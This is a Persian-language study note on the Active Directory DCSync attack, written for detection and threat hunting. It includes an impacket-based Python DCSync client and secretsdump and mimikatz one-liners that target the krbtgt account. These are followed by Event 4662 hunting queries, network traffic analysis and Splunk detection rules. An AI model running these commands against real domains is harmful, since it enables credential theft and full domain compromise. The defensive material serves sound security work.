
# حمله DCSync

## مفهوم کلی

DCSync یک تکنیک post-exploitation است که به مهاجم اجازه می‌دهد بدون نیاز به اجرای کد روی Domain Controller، از راه دور اطلاعات حساس مانند password hash های کاربران را از Active Directory استخراج کند.

## پروتکل Replication در Active Directory

Active Directory از پروتکل **Directory Replication Service Remote Protocol (MS-DRSR)** برای همگام‌سازی داده‌ها بین Domain Controller ها استفاده می‌کند.

### فرآیند Replication:

1. **درخواست تغییرات**: یک DC از DC دیگر تغییرات را درخواست می‌کند
2. **تایید هویت**: DC درخواست‌کننده باید دارای مجوزهای لازم باشد
3. **ارسال داده**: DC مبدا، تغییرات شامل password hash ها را ارسال می‌کند

مهاجم با جعل این درخواست، خود را به‌عنوان یک DC معرفی می‌کند.

## حقوق دسترسی مورد نیاز

برای اجرای DCSync، حساب کاربری باید دارای یکی از این مجوزها باشد:

### 1. **DS-Replication-Get-Changes** 
- GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
- اجازه خواندن تغییرات metadata

### 2. **DS-Replication-Get-Changes-All**
- GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
- اجازه خواندن تمام داده‌ها شامل password hash

### 3. **DS-Replication-Get-Changes-In-Filtered-Set** (اختیاری)
- GUID: `89e95b76-444d-4c62-991a-0facbeda640c`
- برای RODC replication

![[Pasted image 20260627053654.png]]


![[Pasted image 20260627053702.png]]



به‌طور پیش‌فرض، گروه‌های زیر این حقوق را دارند:
- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers

## نحوه اجرای حمله

```python
#!/usr/bin/env python3
"""
DCSync Attack Implementation
استخراج NTLM hash با استفاده از پروتکل DRS
"""

from impacket.dcerpc.v5 import drsuapi, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.uuid import string_to_bin
import sys

class DCSync:
    def __init__(self, domain, username, password, target_dc, target_user):
        """
        domain: نام دامنه (مثال: contoso.local)
        username: کاربر با دسترسی replication
        password: رمز عبور
        target_dc: آدرس Domain Controller
        target_user: کاربر هدف برای استخراج hash
        """
        self.domain = domain
        self.username = username
        self.password = password
        self.target_dc = target_dc
        self.target_user = target_user
        self.dce = None
        
    def connect(self):
        """ایجاد ارتباط RPC با DC"""
        # ساخت connection string
        string_binding = f'ncacn_ip_tcp:{self.target_dc}[135]'
        
        # ایجاد transport layer
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.set_credentials(
            self.username, 
            self.password, 
            self.domain
        )
        
        # اتصال به سرویس DRSUAPI
        self.dce = rpc_transport.get_dce_rpc()
        self.dce.connect()
        
        # Bind به interface DRS
        self.dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
        print(f"[+] متصل شد به {self.target_dc}")
        
    def get_domain_info(self):
        """دریافت اطلاعات دامنه و ایجاد handle"""
        # ارسال درخواست DRSBind - شروع session
        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        
        # مشخصات client که خود را DC معرفی می‌کند
        drs_extensions = drsuapi.DRS_EXTENSIONS()
        drs_extensions['cb'] = len(drs_extensions)
        drs_extensions['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | \
                                     drsuapi.DRS_EXT_GETCHGREPLY_V6 | \
                                     drsuapi.DRS_EXT_GETCHGREQ_V8
        
        request['pextClient']['cb'] = len(drs_extensions)
        request['pextClient']['rgb'] = list(bytes(drs_extensions))
        
        # ارسال درخواست
        resp = self.dce.request(request)
        self.drs_handle = resp['phDrs']
        print("[+] DRS Handle دریافت شد")
        
        # دریافت naming context (NC) - root دامنه
        request = drsuapi.DRSCrackNames()
        request['hDrs'] = self.drs_handle
        request['dwInVersion'] = 1
        
        # تبدیل نام دامنه به DN format
        request['pmsgIn']['V1']['formatOffered'] = drsuapi.DS_NT4_ACCOUNT_NAME
        request['pmsgIn']['V1']['formatDesired'] = drsuapi.DS_FQDN_1779_NAME
        request['pmsgIn']['V1']['rpNames'][0]['pName'] = f'{self.domain}\\'
        
        resp = self.dce.request(request)
        self.domain_dn = resp['pmsgOut']['V1']['pResult']['rItems'][0]['pName']
        print(f"[+] Domain DN: {self.domain_dn}")
        
        return self.domain_dn
    
    def get_user_sid(self):
        """تبدیل نام کاربری به SID و DN"""
        request = drsuapi.DRSCrackNames()
        request['hDrs'] = self.drs_handle
        request['dwInVersion'] = 1
        
        # درخواست تبدیل username به DN
        request['pmsgIn']['V1']['formatOffered'] = drsuapi.DS_NT4_ACCOUNT_NAME
        request['pmsgIn']['V1']['formatDesired'] = drsuapi.DS_UNIQUE_ID_NAME
        request['pmsgIn']['V1']['rpNames'][0]['pName'] = \
            f'{self.domain}\\{self.target_user}'
        
        resp = self.dce.request(request)
        user_record = resp['pmsgOut']['V1']['pResult']['rItems'][0]
        
        if user_record['status'] != 0:
            raise Exception(f"کاربر پیدا نشد: {self.target_user}")
        
        self.user_guid = user_record['pName']
        print(f"[+] User GUID: {self.user_guid}")
        
        # دریافت DN کاربر
        request['pmsgIn']['V1']['formatOffered'] = drsuapi.DS_UNIQUE_ID_NAME
        request['pmsgIn']['V1']['formatDesired'] = drsuapi.DS_FQDN_1779_NAME
        request['pmsgIn']['V1']['rpNames'][0]['pName'] = self.user_guid
        
        resp = self.dce.request(request)
        self.user_dn = resp['pmsgOut']['V1']['pResult']['rItems'][0]['pName']
        print(f"[+] User DN: {self.user_dn}")
        
    def get_ntlm_hash(self):
        """استخراج NTLM hash با DRSGetNCChanges"""
        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = self.drs_handle
        request['dwInVersion'] = 8
        
        # تنظیمات درخواست replication
        request['pmsgIn']['V8']['uuidDsaObjDest'] = drsuapi.NTDSAPI_CLIENT_GUID
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = drsuapi.NTDSAPI_CLIENT_GUID
        
        # naming context - کل دامنه
        dsname = drsuapi.DSNAME()
        dsname['SidLen'] = 0
        dsname['Guid'] = string_to_bin(self.user_guid)
        dsname['StringName'] = (self.user_dn + '\x00')
        
        request['pmsgIn']['V8']['pNC'] = dsname
        
        # فقط یک object خاص را می‌خواهیم
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        
        # درخواست تمام attribute ها شامل secret attributes
        request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC | \
                                             drsuapi.DRS_WRIT_REP | \
                                             drsuapi.DRS_NEVER_SYNCED | \
                                             drsuapi.DRS_FULL_SYNC_NOW | \
                                             drsuapi.DRS_SYNC_URGENT
        
        # لیست attribute هایی که می‌خواهیم (password hash)
        request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = 0
        request['pmsgIn']['V8']['pPartialAttrSet'] = NULL
        request['pmsgIn']['V8']['pPartialAttrSetEx'] = NULL
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
        
        print("[+] ارسال درخواست DRSGetNCChanges...")
        resp = self.dce.request(request)
        
        # Parse کردن پاسخ و استخراج hash
        if resp['pmsgOut']['V6']['cNumObjects'] == 0:
            print("[-] هیچ داده‌ای دریافت نشد")
            return None
        
        # پردازش replicated object
        replication_data = resp['pmsgOut']['V6']['PrefixTableSrc']
        objects = resp['pmsgOut']['V6']['pObjects'][0]
        
        print(f"\n[+] اطلاعات استخراج شده برای {self.target_user}:")
        
        # استخراج supplementalCredentials که حاوی hash است
        # در پیاده‌سازی واقعی باید attribute ها را decode کرد
        # این بخش ساده‌سازی شده است
        
        return resp
    
    def disconnect(self):
        """قطع ارتباط"""
        if self.dce:
            # ارسال DRSUnbind
            request = drsuapi.DRSUnbind()
            request['phDrs'] = self.drs_handle
            self.dce.request(request)
            self.dce.disconnect()
            print("[+] ارتباط قطع شد")

def main():
    # مثال استفاده
    dcsync = DCSync(
        domain='contoso.local',
        username='admin',
        password='P@ssw0rd',
        target_dc='192.168.1.10',
        target_user='krbtgt'
    )
    
    try:
        dcsync.connect()
        dcsync.get_domain_info()
        dcsync.get_user_sid()
        dcsync.get_ntlm_hash()
    except Exception as e:
        print(f"[-] خطا: {str(e)}")
    finally:
        dcsync.disconnect()

if __name__ == '__main__':
    main()
```

## توضیح کد

### 1. **اتصال (connect)**
- از `ncacn_ip_tcp` برای RPC over TCP استفاده می‌شود
- bind به UUID سرویس DRSUAPI: `e3514235-4b06-11d1-ab04-00c04fc2dcd2`

### 2. **DRSBind**
- ایجاد session با DC
- ارسال `DRS_EXTENSIONS` که capabilities client را مشخص می‌کند
- دریافت handle برای درخواست‌های بعدی

### 3. **DRSCrackNames**
- تبدیل format های مختلف نام (NT4 → DN → GUID)
- پیدا کردن Distinguished Name و GUID کاربر هدف

### 4. **DRSGetNCChanges**
- قلب حمله DCSync
- `ulFlags` شامل:
  - `DRS_INIT_SYNC`: شروع همگام‌سازی اولیه
  - `DRS_WRIT_REP`: درخواست writable replica
- `ulExtendedOp = EXOP_REPL_OBJ`: replication یک object خاص
- سرور فکر می‌کند یک DC معتبر داریم و تمام attribute ها شامل `unicodePwd`, `supplementalCredentials` را برمی‌گرداند

### 5. **پردازش پاسخ**
در کد واقعی (مثل secretsdump.py از impacket) باید:
- `supplementalCredentials` را decrypt کرد
- NTLM hash, LM hash, Kerberos keys را استخراج کرد

## ابزارهای آماده

```bash
# با impacket
secretsdump.py 'contoso.local/admin:P@ssw0rd@192.168.1.10' -just-dc-user krbtgt

# با mimikatz
lsadump::dcsync /domain:contoso.local /user:krbtgt
```

## کشف و پیشگیری

**کشف:**
- مانیتور Event ID 4662 (Replication-Get-Changes)
- BloodHound برای یافتن path های غیرمعمول

**پیشگیری:**
- محدود کردن دسترسی replication
- استفاده از Protected Users group
- فعال‌سازی Advanced Threat Analytics (ATA)




---

### Hunting 

![[Pasted image 20260627060308.png]]


![[Pasted image 20260627060329.png]]

به SID ها دقت کنید 
این SID ها مشخص کننده replication هستن 


### 1. **DS-Replication-Get-Changes** 
- GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
- اجازه خواندن تغییرات metadata

### 2. **DS-Replication-Get-Changes-All**
- GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
- اجازه خواندن تمام داده‌ها شامل password hash

### 3. **DS-Replication-Get-Changes-In-Filtered-Set** (اختیاری)
- GUID: `89e95b76-444d-4c62-991a-0facbeda640c`


این دسترسی ها معادل GUID دارن 

![[Pasted image 20260627060744.png]]



ما ممکنه که این لاگ هارو داشته باشیم 
تو rule که مینویسیم باید یه سری IP ها رو حذف کنیم مثلا IP سرور ادیشنال چون اگر admin یک سرور ادیشنال بزاره این لاگ تولید میشه 




پس این موارد باید مانیتور بشه 

|                                            |                                      |
| ------------------------------------------ | ------------------------------------ |
| DS-Replication-Get-Changes                 | 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 |
| DS-Replication-Get-Changes-All             | 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 |
| DS-Replication-Get-Changes-In-Filtered-Set | 89e95b76-444d-4c62-991a-0facbeda640c |


### Analytic I

Monitoring for non-dc machine accounts accessing active directory objects on domain controllers with replication rights might be suspicious.

|Data source|Event Provider|Relationship|Event|
|---|---|---|---|
|Windows active directory|Microsoft-Windows-Security-Auditing|User accessed AD Object|4662|

### Analytic II

You can use successful authentication events on the domain controller to get information about the source of the AD Replication Service request.

|Data source|Event Provider|Relationship|Event|
|---|---|---|---|
|Authentication log|Microsoft-Windows-Security-Auditing|User authenticated Host|4624|
|Windows active directory|Microsoft-Windows-Security-Auditing|User accessed AD Object|4662|


#### Logic

```
SELECT o.`@timestamp`, o.Hostname, o.SubjectUserName, o.SubjectLogonId, a.IpAddress
FROM dataTable o
INNER JOIN (
    SELECT Hostname,TargetUserName,TargetLogonId,IpAddress
    FROM dataTable
    WHERE LOWER(Channel) = "security"
        AND EventID = 4624
        AND LogonType = 3
        AND NOT TargetUserName LIKE "%$"
    ) a
ON o.SubjectLogonId = a.TargetLogonId
WHERE LOWER(o.Channel) = "security"
    AND o.EventID = 4662
    AND o.AccessMask = "0x100"
    AND (
        o.Properties LIKE "%1131f6aa_9c07_11d1_f79f_00c04fc2dcd2%"
        OR o.Properties LIKE "%1131f6ad_9c07_11d1_f79f_00c04fc2dcd2%"
        OR o.Properties LIKE "%89e95b76_444d_4c62_991a_0facbeda640c%"
    )
    AND o.Hostname = a.Hostname
    AND NOT o.SubjectUserName LIKE "%$"
```



#### Pandas Query


```
adObjectAccessDf = (
df[['@timestamp','Hostname','SubjectUserName','SubjectLogonId']]

[(df['Channel'].str.lower() == 'security')
    & (df['EventID'] == 4662)
    & (df['AccessMask'] == '0x100')
    & (
        (df['Properties'].str.contains('.*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2.*', regex=True))
        | (df['Properties'].str.contains('.*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.*', regex=True))
        | (df['Properties'].str.contains('.*89e95b76-444d-4c62-991a-0facbeda640c.*', regex=True))
    )
    & (~df['SubjectUserName'].str.endswith('.*$', na=False))
]
)

networkLogonDf = (
df[['@timestamp','Hostname','TargetUserName','TargetLogonId','IpAddress']]

[(df['Channel'].str.lower() == 'security')
    & (df['EventID'] == 4624)
    & (df['LogonType'] == 3)
    & (~df['SubjectUserName'].str.endswith('.*$', na=False))
]
)

(
pd.merge(adObjectAccessDf, networkLogonDf,
    left_on = 'SubjectLogonId', right_on = 'TargetLogonId', how = 'inner')
)
```




### network Traffic

![[Pasted image 20260705031922.png]]


در ترافیک های RPC شروع ارتباط از طریق **DECRPC** هستش و تو پکت های بعدی مبتنی بر **EPM** یا همون **Endpoint RPC Mapping** که این ارتباط یک ارتباط مبتنی بر Pipe هست که بر بستر RPC سوار میشه 

این EPM از سمت مبدا به سمت مقصد درخواست میشه 
و پورتی که این وسط وجود داره یک **پورت از 49152 شروع میشه تا 65535** 


![[Pasted image 20260705032201.png]]


همونطور که میبینید یک شناسه محنصر به فرد هم داریم  


![[Pasted image 20260705032243.png]]

همونطور که می بینید  RPC Mapping داریم که دیگه ارتباط روی پورت 135 نیست بلکه روی یه پورت دیگه هستش اون Session


## DRSUAPI چیست؟

**DRSUAPI**
پروتکلی است که Domain Controllerها از آن برای **همگام‌سازی اطلاعات Active Directory** با یکدیگر استفاده می‌کنند.

مثلاً وقتی روی یک DC یک کاربر جدید ساخته می‌شود، تغییرات باید به DCهای دیگر هم منتقل شود. این فرآیند replication از طریق مکانیزم‌هایی انجام می‌شود که DRSUAPI یکی از مهم‌ترین آن‌هاست.


پس تو ترافیک های شبکه باید این پروتوکل هارو داشته باشیم

- DRSUAPI
- EPM
- DCERPC

این ترافیک ها باید برسی شن 

و در لاگ Endpoint باید EventCode 4662 باید Replication GUID ها برسی شن که چه Access Mask داریم 


![[Pasted image 20260705051304.png]]

همونطور که مشاهده میکنید از این پرتوکلر متود DsGetDomainControllerInfo زده شده از سمت IP مربوط به اتکر 



---
---

#### برسی سورس کد mimikatz برای این حمله 


![[Pasted image 20260713040828.png]]

یه استراکچری وجود دارد   تحت عنوان DRS_MSG_GETCHGREPLY  که باید ممبر های مربوط به این استراکچر feel بشه یعنی پر بشه و بعدش تو قدم بعد از سمت kernel یه handle دریافت بشه برای اینکه ما بتونیم از طریق این object ها یعنی 
- DS-Replication-Get-Changes-In-Filtered-Set
- DS-Replication-Get-Changes 
- DS-Replication-Get-Changes-All

با استفاده از تابعی که وجود دارد بیایم و باهاش object که میخواهیم رو از سمت DC دریافت کنیم 


![[Pasted image 20260713041256.png]]

همونطور که میبینید ممبر مربوط به ulflags میایم و دیتایی که فلگی که وجود دارد رو ست میکنیم و در نهایت تو قدم بعدی با استفاده از member مربوط به cmaxobject پارامتر اول مربوط به این متود رو روی All Data میازیم 

![[Pasted image 20260713041515.png]]

این استراکچر در level های مختلفی به ما اطلاعات رو میده که از level هایی که در تصویر هایلایت شده برای 
- DS-Replication-Get-Changes-All
استفاده میشن 

![[Pasted image 20260713041726.png]]

هموطنرو که ذر سورس میبنید به صورت دیفالت رو level 8 تنظیم شده اما بسته به ورژن و دیتایی که داره میتونه تو level های مختلفی کار کنه 



---


ما   راجبه RPC زیاد صحبت کردیم بریم تو قدم بعدی لاگ های  مربوط به RPC رو برسی کنیم 

لاگی باید بریم دنبالش EventCode 5712 هستش
فلگی که مد نظرمون هست InterfaceID که این فلگ باید برابر باشه با GUID مربوط به DS-Get-Replication-change یا سایر Guid های مرتبط 


---
---
---

#### Rule For Detection

```spl
index=windows EventCode=4662 Access_Mask=0x100
| rex field=_raw max_match=10 "Properties:\s+Control Access\s+(?<ReplicationGUID>\{[0-9a-fA-F\-]+\})"
| where NOT like(Account_Name,"%$")
| search ReplicationGUID IN (
"{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
"{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
"{89e95b76-444d-4c62-991a-0facbeda640c}"
)
| eval Severity="Critical"
| eval MITRE="T1003.006"
| eval Technique="DCSync"
| table _time host Account_Name Technique MITRE ReplicationGUID Severity
```


![[Pasted image 20260724235846.png]]

#### SPL Rule

```spl
index=windows EventCode=4662 Access_Mask=0x100
| rex field=_raw max_match=10 "Properties:\s+Control Access\s+(?<ReplicationGUID>\{[0-9a-fA-F\-]+\})"
| where NOT like(Account_Name,"%$")
| search ReplicationGUID IN (
"{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
"{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
"{89e95b76-444d-4c62-991a-0facbeda640c}"
)
| eval ReplicationRight=case(
    ReplicationGUID="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}","DS-Replication-Get-Changes",
    ReplicationGUID="{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}","DS-Replication-Get-Changes-All",
    ReplicationGUID="{89e95b76-444d-4c62-991a-0facbeda640c}","DS-Replication-Get-Changes-In-Filtered-Set"
)
| eval Severity="Critical"
| eval MITRE="T1003.006"
| eval Technique="DCSync"
| table _time host Account_Name ReplicationRight Severity Technique MITRE
```

![[Pasted image 20260725000142.png]]
